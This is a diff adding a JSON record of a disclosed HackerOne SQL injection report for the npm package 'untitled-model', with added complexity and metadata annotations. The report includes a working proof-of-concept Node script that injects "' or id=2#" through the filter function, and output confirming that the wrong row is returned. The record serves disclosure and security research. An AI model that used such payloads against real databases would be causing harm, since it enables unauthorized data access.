@@ -1,0 +1,53 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "verichains ",
+  "title": "[untitled-model] sql injection",
+  "content": "\nI would like to report [VULNERABILITY] in [MODULE]\nIt allows [DESCRIBE THE IMPACT OF THE VULNERABILITY - E.G READ ARBITRARY FILES, READ DATA FROM DATABASE ETC]\nModule\nmodule name: untitled-model\nversion: 1.0.5\nnpm page: https://www.npmjs.com/package/untitled-model\nModule Description\nRapid sql query generator extention for node.\n[![NPM Version][npm-image]][npm-url] [![NPM Downloads][downloads-image]][downloads-url]\nInstallation\nFeatures\nQuick Start\nModel\nForeign Key\nFunctions\nfilter()\nvalues()\nall(callback)\nupdate(callback)\nfilter()\nvalues()\nall(callback)\nupdate(callback)\nmodel\nModule Stats\nReplace stats below with numbers from npm\u2019s module page:\n8 downloads in the last week\n17 downloads in the last month\nVulnerability\nVulnerability Description\nMultiple sql injections problems due to unescaped input usage.\nSteps To Reproduce:\ninstall the module yarn add untitled-model\nsetup db:\nCode 303 Bytes\n1CREATE TABLE `user` (\n2  `id` int(11) NOT NULL,\n3  `firstName` varchar(255) NOT NULL,\n4  `lastName` varchar(255) NOT NULL,\n5  `age` int(11) NOT NULL\n6) ENGINE=InnoDB DEFAULT CHARSET=latin1;\n7INSERT INTO `user` (`id`, `firstName`, `lastName`, `age`) VALUES\n8(1, 'Timber', 'Saw', 25),\n9(2, 'Timber 0', 'Saw', 25);\nrun the poc script:\nCode 609 Bytes\n1var model = require('untitled-model');\n2model.connection(\n3\t{   \n4\t\thost: \"localhost\",\n5\t\tuser: \"root\",\n6\t\tpassword: \"\",\n7\t\tdatabase:\"test\"\n8\t}\n9);\n10var User = model.get('user');\n11//User.all((err,data)=>{\n12//\tconsole.log(err,data);\n13//})\n14\n15(async () => {\n16\tawait new Promise((resolve,reject)=>{\n17\t\tUser.filter({'id': 1},function(err,data){\n18\t\t\tif(err) throw err;\n19\t\t\tconsole.log('normal query', data);\n20\t\t\tresolve();\n21\t\t});\n22\t});\n23\tawait new Promise((resolve,reject)=>{\n24\t\tUser.filter({'id': \"' or id=2#\"},function(err,data){\n25\t\t\tif(err) throw err;\n26\t\t\tconsole.log('sqli query', data);\n27\t\t\tresolve();\n28\t\t});\n29\t});\n30\tprocess.exit(0);\n31})()\nOutput:\nCode 175 Bytes\n1normal query [ RowDataPacket { id: 1, firstName: 'Timber', lastName: 'Saw', age: 25 } ]\n2sqli query [ RowDataPacket { id: 2, firstName: 'Timber 0', lastName: 'Saw', age: 25 } ]\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nMacOS\n8.12.0\n6.4.1\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nSql injection.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1560857100,
+  "report_url": "https://hackerone.com/reports/507222",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the module using `yarn add untitled-model`"
+    ],
+    [
+      2,
+      "Set up a database with a `user` table and insert some test data"
+    ],
+    [
+      3,
+      "Run a proof-of-concept script that demonstrates SQL injection by manipulating the `id` parameter in the `filter` function"
+    ],
+    [
+      4,
+      "Observe the output showing that the SQL injection was successful, returning data for `id=2` when the query was designed to fetch `id=1`"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a SQL injection in the `untitled-model` npm package, which does not properly escape user inputs in its query generation functions. This allows an attacker to manipulate SQL queries by injecting malicious input, potentially leading to unauthorized data access or other database operations.",
+  "reason": "The vulnerability is straightforward to exploit as it involves a common SQL injection pattern without any need for complex interactions or state manipulations. The attack simply requires injecting SQL code through user-controlled input fields.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability reported involves unescaped input usage in a database query, which is not related to authentication or authorization (AuthN/AuthZ) boundaries. The proposed methodologies focus on testing AuthN/AuthZ vulnerabilities by swapping user sessions or resource IDs, not on input validation or SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
